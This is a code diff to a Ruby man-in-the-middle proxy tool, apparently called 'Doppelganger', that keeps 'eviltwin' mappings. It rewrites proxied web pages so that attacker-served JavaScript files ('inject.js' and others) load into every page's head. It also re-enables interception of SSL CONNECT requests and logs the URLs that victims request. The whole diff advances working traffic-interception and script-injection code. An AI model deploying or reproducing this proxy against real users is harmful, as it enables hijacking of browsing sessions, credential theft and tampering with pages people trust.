@@ -2,9 +2,7 @@
 #
 
 # define external libraries
-require "rubygems"
-require "dnsruby"
-require "packr"
+
 require "optparse"
 require "socket"
 require "net/http"
@@ -15,6 +13,9 @@ require "webrick/httpproxy"
 require "webrick/httputils"
 require "pp"
 require "base64"
+require "rubygems"
+require "dnsruby"
+require "packr"
 
 $eviltwin_mapping = nil
 $eviltwins = []
@@ -169,7 +170,7 @@ class Doppelganger
 
 		def initialize(config)
 			# Javascript get loaded in reverse order (LIFO)
-			@InjectionScripts = Array["prototype.js", "utility.js", "inject.js"]
+			@InjectionScripts = Array["jquery.js", "utility.js", "inject.js"]
 			@PackedScripts = {}
 			@FakeServerFiles = ["/doppelganger"]
 
@@ -324,29 +325,21 @@ class Doppelganger
 			}
 
 			if perform_transformation && response.content_type =~ /text/i
-					server_url = "http://" + @HttpdAddr + ":" + @HttpdPort.to_s + "/"
-					
-					server_url = "#{uri.scheme}://#{uri.host}:#{uri.port}/"
+					server_url = "http://" + @HttpdAddr + ":" + @HttpdPort.to_s				
+					#server_url = "#{uri.scheme}://#{uri.host}:#{uri.port}/"
 
 					@InjectionScripts.reverse_each { |script|									
 						packed_code = @PackedScripts[script]	
+						script_url = "#{server_url}/#{script}"
 						#html = "<script language=\"javascript\" type=\"text/javascript\">#{unpacked_code}</script></head>"
+						#unpacked_code.gsub!(/\n/, "") 
+						#packed_code = Packr.pack(unpacked_code, :shrink_vars => true, :protect => ["$super"])
 
-						js_url = "#{server_url}#{@RandomNum}_#{script}"
-
-						if response.body =~ /\<\/body\>/i
-							html = "</body><script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script>"
-							response.body.gsub!(/\<\/body\>/i, html)
-						else
-							html = "</head><script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script>"
-							response.body.gsub!(/\<\/head\>/i, html)
+						html = "<head><script src=\"#{script_url}\" language=\"javascript\" type=\"text/javascript\"></script>"
+						if response.body != nil
+							response.body.gsub!(/<head>/i) {|block| html}							
 						end
-					}	
-
-					#init_js = 'Event.observe(window, "load", function() { initialize_doppelganger(); });'
-					#init_tags = "<script language=\"javascript\" type=\"text/javascript\">#{init_js}</script></head>"
-					#response.body.gsub!(/\<\/head\>/i, init_tags)
-
+					}
 					return response.body
 			else
 				return response.body				
@@ -450,7 +443,8 @@ class Doppelganger
 				user_mime_table = system_mime_table.update(
 					{
 				 		"dat" => "application/x-ns-proxy-autoconfig",
-						"php" => "application/xhtml+xml"
+						"php" => "application/xhtml+xml",
+						"js" => "text/javascript"
 					}
 				)
 
@@ -523,7 +517,7 @@ end
 class WebDistortProxy < WEBrick::HTTPProxyServer
 	alias old_proxy_connect proxy_connect
 	def proxy_connect(req, res)
-		#req.createDoppelganger	
+		req.createDoppelganger	
 		old_proxy_connect(req, res)
 	end
 end
@@ -595,6 +589,8 @@ class DoppelgangerSSLIntermediary < WEBrick::HTTPServlet::AbstractServlet
       	http.request_get(uri.path, header) {|res|
 					response << res['content-type']
 					response << res.body
+					puts request.request_uri.to_s
+					puts res['content-type']
      	 }
     	}
 		return "200", response[0], response[1]
@@ -608,7 +604,7 @@ end
 def request_get_header(request)
 	header = {}
 	request.raw_header.each {|line| 
-		puts line
+		#puts line
 		key, item = line.split(":") 
 		header[key] = item
 	}
